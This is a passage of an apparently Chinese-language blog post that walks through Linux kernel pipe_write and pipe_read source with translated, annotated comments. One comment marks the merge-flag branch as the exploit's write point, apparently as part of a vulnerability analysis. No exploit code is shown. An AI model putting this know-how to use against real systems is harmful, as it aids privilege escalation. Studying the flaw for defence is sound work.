class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line"><span class="type">ssize_t</span> chars;</span><br><span class="line"><span class="type">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="type">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null write succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;<span class="comment">// 管道没有读者，返回</span></span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">ret = -EXDEV;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若管道非空，我们尝试将新数据合并到最后一个buffer 中</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这自然会合并小的写操作，但其也会对</span></span><br><span class="line"><span class="comment"> * 跨越多个页框的大的写操作的剩余写入操作</span></span><br><span class="line"><span class="comment"> * 进行页面对齐</span></span><br><span class="line"><span class="comment"> * （译注：大概就是先尝试把数据写到管道的最后一个buffer（如果对应 page 没写满的话））</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">head = pipe-&gt;head;<span class="comment">// 获取队列头</span></span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail); <span class="comment">// head == tail</span></span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<span class="comment">// 管道非空，且上一个 buf 没写满</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask]; <span class="comment">// 找到上一个 buf</span></span><br><span class="line"><span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 设置了PIPE_BUF_FLAG_CAN_MERGE标志位，</span></span><br><span class="line"><span class="comment">         * 说明该 buffer 可用于直接写入，</span></span><br><span class="line"><span class="comment">         * 直接把数据拷贝进去后就返回</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// 注：这是漏洞利用的写入点</span></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写满 last buffer 对应数据后，接下来将剩余数据写到往后的 buffer 中</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;<span class="comment">// 没有读者，返回</span></span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123; <span class="comment">// 管道没满，正常写入</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line"><span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;<span class="comment">// 没有预先准备page，分配一个新的</span></span><br><span class="line">page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">ret = ret ? : -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 提前在环中分配一个 slot，并附加一个空 buffer。</span></span><br><span class="line"><span class="comment"> * 若我们出错或未能使用它，</span></span><br><span class="line"><span class="comment"> * 它会被读者所使用，</span></span><br><span class="line"><span class="comment"> * 亦或是保留在这里等待下一次写入。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<span class="comment">// 管道满了，开启下一次循环</span></span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 将其插入 buffer array 中 */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (is_packetized(filp))<span class="comment">// 设置 buffer 的 flag，若设置了 O_DIRECT 则为 PACKET</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);<span class="comment">// 将数据拷贝到 buffer 对应 page 上</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += copied;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))<span class="comment">// 读完数据了，退出循环</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<span class="comment">// 管道没满，继续下一次循环</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 等待缓冲区空间可用. */</span></span><br><span class="line">        <span class="comment">// 管道满了，等他变空</span></span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -ERESTARTSYS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 我们将释放管道的锁，等待（有）更多的空间。</span></span><br><span class="line"><span class="comment"> * 若有必要我们将唤醒任意读者，在等待后我们需要重新检查</span></span><br><span class="line"><span class="comment"> * 在我们释放锁后管道是否变空了</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (was_empty)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">wake_next_writer = <span class="literal">false</span>;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若我们进行了一次唤醒事件，我们做一个“同步”唤醒，</span></span><br><span class="line"><span class="comment"> * 因为相比起让数据仍旧等待，我们想要让读者去尽快</span></span><br><span class="line"><span class="comment"> * 处理事情</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 尤其是，这对小的写操作重要，这是因为（例如）GNU 让</span></span><br><span class="line"><span class="comment"> * jobserver 使用小的写操作来唤醒等待的工作</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Epoll 则没有意义地想要一个唤醒，</span></span><br><span class="line"><span class="comment"> * 无论管道是否已经空了</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (was_empty || pipe-&gt;poll_usage)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line"><span class="keyword">if</span> (wake_next_writer)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;</span><br><span class="line"><span class="type">int</span> err = file_update_time(filp);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">ret = err;</span><br><span class="line">sb_end_write(file_inode(filp)-&gt;i_sb);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="管道的读出过程"><a href="#管道的读出过程" class="headerlink" title="管道的读出过程"></a>管道的读出过程</h3><p>从管道中读出数据则是通过 <code>pipe_read</code>，主要是读取 buffer 对应 page 上的数据，若一个 buffer 被读完了则将其出列</p><p>原理还是比较简单的，这里就不深入分析了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *to)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> total_len = iov_iter_count(to);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="type">bool</span> was_full, wake_next_reader = <span class="literal">false</span>;</span><br><span class="line"><span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null read succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若管道满了，我们只在开始读取时唤醒写者</span></span><br><span class="line"><span class="comment"> * 以避免没有必要的唤醒</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 但当我们唤醒写者时，我们使用一个同步唤醒(WF_SYNC)</span></span><br><span class="line"><span class="comment"> * 因为我们想要他们行动起来并为我们生成更多数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head = pipe-&gt;head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail = pipe-&gt;tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;note_loss) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification</span> <span class="title">n</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (total_len &lt; <span class="number">8</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -ENOBUFS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n.type = WATCH_TYPE_META;</span><br><span class="line">n.subtype = WATCH_META_LOSS_NOTIFICATION;</span><br><span class="line">n.info = watch_sizeof(n);</span><br><span class="line"><span class="keyword">if</span> (copy_to_iter(&amp;n, <span class="keyword">sizeof</span>(n), to) != <span class="keyword">sizeof</span>(n)) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += <span class="keyword">sizeof</span>(n);</span><br><span class="line">total_len -= <span class="keyword">sizeof</span>(n);</span><br><span class="line">pipe-&gt;note_loss = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_empty(head, tail)) &#123;<span class="comment">// 管道非空，逐 buffer 读出数据</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];</span><br><span class="line"><span class="type">size_t</span> chars = buf-&gt;len;</span><br><span class="line"><span class="type">size_t</span> written;</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chars &gt; total_len) &#123;</span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -ENOBUFS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">chars = total_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = error;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将 buffer 对应 page 数据拷贝出来</span></span><br><span class="line">written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);</span><br><span class="line"><span class="keyword">if</span> (unlikely(written &lt; chars)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += chars;</span><br><span class="line">buf-&gt;offset += chars;</span><br><span class="line">buf-&gt;len -= chars;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这是一个 packet buffer？清理并退出 */</span></span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;</span><br><span class="line">total_len = chars;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!buf-&gt;len) &#123;<span class="comment">// buffer 空了，释放</span></span><br><span class="line">pipe_buf_release(pipe, buf);</span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)</span><br><span class="line">pipe-&gt;note_loss = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">tail++;<span class="comment">// 被读的 buffer 出队</span></span><br><span class="line">pipe-&gt;tail = tail;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">&#125;</span><br><span class="line">total_len -= chars;</span><br><span class="line"><span class="keyword">if</span> (!total_len)</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">/* 常规路径：读取成功 */</span></span><br><span class="line"><span class="keyword">if</span> (!pipe_empty(head, tail))<span class="comment">/* More to do? */</span></span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">// 没读完，还有数据，接着读</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;writers)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 我们只有在确实没读到东西时到达这里</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 然而，我们或许已看到（并移除） 一个 size 为 0 的 buffer，</span></span><br><span class="line"><span class="comment"> * 这可能会在 buffers 中创造空间</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 你无法通过一个空写入来制造 size 为 0 的 pipe buffers（packet mode 也不行）</span></span><br><span class="line"><span class="comment"> * 但若写者在尝试填充一个已经分配并插入到 buffer 数组中</span></span><br><span class="line"><span class="comment"> * 的 buffer 时获得了一个 EFAULT，则这是有可能发生的</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 故我们仍需在【非常】不太可能发生的情况：</span></span><br><span class="line"><span class="comment"> * “管道满了，但我们没有获得数据”下</span></span><br><span class="line"><span class="comment"> * 唤醒任何等待的写者</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(was_full))</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 但因为我们没有读到任何东西，若我们打断了，则这时候我们可以直接</span></span><br><span class="line"><span class="comment"> * 返回一个-ERESTARTSYS，</span></span><br><span class="line"><span class="comment"> * 因为我们已经完成了任何所需的环境，没有必要标记任何可访问. </span></span><br><span class="line"><span 